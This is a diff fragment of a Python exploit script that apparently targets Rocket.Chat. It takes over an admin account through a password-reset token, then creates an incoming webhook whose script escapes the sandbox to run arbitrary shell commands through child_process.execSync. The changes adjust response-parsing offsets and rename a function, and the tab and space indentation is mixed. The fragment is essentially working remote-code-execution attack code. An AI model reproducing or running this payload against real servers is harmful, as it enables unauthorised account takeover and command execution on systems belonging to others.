@@ -125,14 +125,14 @@ def rce(url,cmd):
 	# Creating Integration
 	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"class Script { process_incoming_request() { const require = console.log.constructor(\'return process.mainModule.require\')(); const { execSync } = require(\'child_process\'); res = execSync(\''+cmd+'\'); return { error: { sucess: true, message: res.toString() } } } }","type":"webhook-incoming"}'
 	cookies = {'rc_uid': userid,'rc_token': token}
-	headers = {'X-User-Id': userid,'X-Auth-Token': token}
-	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
-	data = r.text
-	data = data.split(',')
-	token = data[12]
-	token = token[9:57]
-	_id = data[18]
-	_id = _id[7:24]
+        headers = {'X-User-Id': userid,'X-Auth-Token': token}
+        r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
+        data = r.text
+        data = data.split(',')
+        token = data[14]
+        token = token[9:57]
+        _id = data[20]
+        _id = _id[7:24]
 
 	# Triggering RCE
 	u = url + '/hooks/' + _id + '/' +token
@@ -149,7 +149,7 @@ forgotpassword(adminmail,target)
 token = resettoken(target)
 
 ## Resetting Password
-changingadminpassword(target,token)
+changingpassword(target,token)
 
 ## Authenticating and triggering rce
 
